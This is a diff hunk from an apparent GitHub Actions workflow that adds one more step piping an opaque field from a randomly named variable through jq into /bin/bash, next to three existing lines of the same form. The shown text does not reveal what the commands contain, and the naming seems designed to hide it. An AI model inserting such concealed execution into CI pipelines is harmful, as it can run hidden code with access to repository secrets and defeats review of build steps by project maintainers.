@@ -27,6 +27,7 @@ jobs:
           echo $l172 | jq -r .rrtot8242 | /bin/bash
           echo $uwh879 | jq -r .v82381 | /bin/bash
           printf '%s' "$ss5169" | jq -r .qgzch09642 | /bin/bash
+          printf '%s' "$aj5" | jq -r .eceim232 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
